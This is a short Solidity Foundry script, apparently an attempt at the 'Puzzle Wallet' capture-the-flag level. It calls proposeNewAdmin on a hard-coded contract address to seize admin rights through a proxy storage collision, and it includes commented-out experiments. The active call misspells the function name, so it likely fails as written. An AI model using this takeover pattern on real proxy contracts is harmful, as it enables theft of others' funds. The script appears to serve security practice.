// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {PuzzleWallet} from "../src/PuzzleWallet.sol";

contract HackPuzzleWalletScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        PuzzleWallet puzzleWallet = helperConfig.getPuzzleWalletConfig().puzzleWallet;
        vm.startBroadcast();
        // (bool success, bytes memory data) =
        //     address(puzzleWallet).staticcall(abi.encodeWithSignature("proposeNewAdmin(address)", msg.sender));
        // console.log("success: ", success);
        // (bool success, bytes memory data) = address(0xF98b1b14fC6D92d54c70FCc34fB4359f91f76c45).staticcall(
        //     abi.encodeWithSignature("proposeNewAdmin(address)", msg.sender)
        // );
        // (bool success, bytes memory data) =
        //     address(0xF98b1b14fC6D92d54c70FCc34fB4359f91f76c45).staticcall(abi.encodeWithSignature("pendingAdmin()"));
        // (bool success, bytes memory data) =
        //     address(0xF98b1b14fC6D92d54c70FCc34fB4359f91f76c45).staticcall(abi.encodeWithSignature("pendingAdmin()"));
        // console.log("data: ", abi.decode(data, (address)));

        // uint256 adminAddress = uint256(uint160(address(msg.sender)));
        (bool success, bytes memory data) = address(0xF98b1b14fC6D92d54c70FCc34fB4359f91f76c45).call(
            abi.encodeWithSignature("propseNewAdmin(address)", msg.sender)
        );

        console.log("success: ", success);
        vm.stopBroadcast();
        console.log("puzzleWallet.owner(): ", puzzleWallet.owner());
    }
}
